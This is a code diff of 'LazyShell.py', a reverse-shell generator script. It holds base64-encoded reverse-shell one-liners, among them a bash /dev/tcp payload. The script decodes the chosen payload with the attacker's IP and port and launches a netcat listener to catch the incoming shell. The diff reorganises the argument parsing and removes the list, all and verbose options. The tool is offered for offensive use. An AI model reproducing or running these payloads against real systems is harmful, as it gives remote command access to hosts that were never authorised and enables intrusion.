@@ -5,30 +5,6 @@ import sys
 import netifaces as ni
 import os
 
-banner = r'''
-   __                 ___           ______       ____
-  / /  ___ ____ __ __/ _ \___ _  __/ __/ /  ___ / / /
- / /__/ _ `/_ // // / , _/ -_) |/ /\ \/ _ \/ -_) / /
-/____/\_,_//__/\_, /_/|_|\__/|___/___/_//_/\__/_/_/
-              /___/ 	[modified by ch4rm]
-
-'''
-
-print('\033[94m'+banner+'\033[0m')
-
-parser = argparse.ArgumentParser(prog='LazyShell.py', usage='%(prog)s [interface] [Port] [Type]')
-parser.add_argument(type=str, help="[Interface]", dest='interface')
-parser.add_argument(type=int, help="[Port number]", dest='portnum')
-parser.add_argument(type=str, help="[Revers shell type]", dest='type')
-parser.add_argument("-l", "--list", action="store_true", help="List all available shell types", dest='list')
-parser.add_argument("-v", "--verbose", action="store_true", help="Verbose mode", dest='verbose')
-parser.add_argument("-a", "--all", action="store_true", help="Generate all the shells", dest='all')
-
-# got this from here https://stackoverflow.com/a/47440202
-args = parser.parse_args(args=None if sys.argv[1:] else ['--help'])
-
-
-
 shell_dict = {
     
     "bash" : ['YmFzaCAtaSA+JiAvZGV2L3RjcC97MH0vezF9IDA+JjE=', 'MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC97MH0vezF9OyBzaCA8JjE5NiA+JjE5NiAyPiYxOTY='],
@@ -67,43 +43,42 @@ shell_dict = {
 
 }
 
+banner = r'''
+   __                 ___           ______       ____
+  / /  ___ ____ __ __/ _ \___ _  __/ __/ /  ___ / / /
+ / /__/ _ `/_ // // / , _/ -_) |/ /\ \/ _ \/ -_) / /
+/____/\_,_//__/\_, /_/|_|\__/|___/___/_//_/\__/_/_/
+              /___/ 	[modified by ch4rm]
 
-if args.interface or args.portnum != None:
-    if args.interface != None:
-       ip = ni.ifaddresses(args.interface)[ni.AF_INET][0]['addr']
-    else:
-       print ('\033[1m'+'\033[93m'+"[*] "+'\033[0m'+"Using default ip instead")
-       ip = '127.0.0.1'
-    if args.portnum != None:
-       port = args.portnum
-    else:
-       print ('\033[1m'+'\033[93m'+"[*] "+'\033[0m'+"Using default port instead")
-       port = 1234
-else:
-    print ('\033[1m'+'\033[93m'+"[*] "+'\033[0m'+"Using default ip and port instead")
-    ip = '127.0.0.1'
-    port = 1234
+'''
+
+print('\033[94m'+banner+'\033[0m')
+print('Available shells:')
+for k,v in shell_dict.items():
+    print("\033[1m\033[92m["+k+"] \033[0m", end="")
+
+parser = argparse.ArgumentParser(prog='LazyShell.py', usage='%(prog)s [interface] [Port] [Type]')
+parser.add_argument(type=str, help="[Interface]", dest='interface')
+parser.add_argument(type=int, help="[Port number]", dest='portnum')
+parser.add_argument(type=str, help="[Revers shell type]", dest='type')
+
+# got this from here https://stackoverflow.com/a/47440202
+args = parser.parse_args(args=None if sys.argv[1:] else ['--help'])
+
+if args.interface or args.portnum:
+    try:
+        ip = ni.ifaddresses(args.interface)[ni.AF_INET][0]['addr']
+        port = args.portnum
+    except ValueError:
+        print('\n\n\033[1m'+'\033[91m' + "[!] "+'\033[0m' + " Please enter a valid interface name")
+        sys.exit(1)
 
 if args.type: 
-    print('\033[1m'+'\033[92m' + "[*] "+'\033[0m' + args.type + " reverse shell" + " ")
+    print('\n\n\033[1m'+'\033[92m' + "[*] "+'\033[0m' + args.type + " reverse shell" + " ")
     for k,v in shell_dict.items():
         for i in v:
             if k == args.type:
                 x = base64.b64decode(i).decode('utf-8')
                 print('=> '+'\033[1m'+ x.format(ip, port)+'\033[0m')
-
-if args.list:
-    print('\n' + "[>] Available Shells [<]\n")
-    for k,v in shell_dict.items():
-        print(k.capitalize())
-
-if args.all:
-    print('\n' + "[>] Generated All Shells [<]")
-    for k,v in shell_dict.items():
-        for i in v:
-            x = base64.b64decode(i).decode('utf-8')
-            print('\n' + x.format(ip, port))
-
-if not args.verbose:
-        print('\033[1m'+'\033[92m'+"[*] "+'\033[0m' +"Starting the listener on "+str(ip)+":"+str(port)+"...")
-        os.system('nc -lvnp '+ str(port))
+                print('\n\033[1m'+'\033[92m'+"[*] "+'\033[0m' +"Starting the listener on "+str(ip)+":"+str(port)+"...")
+                os.system('nc -lnp '+ str(port))
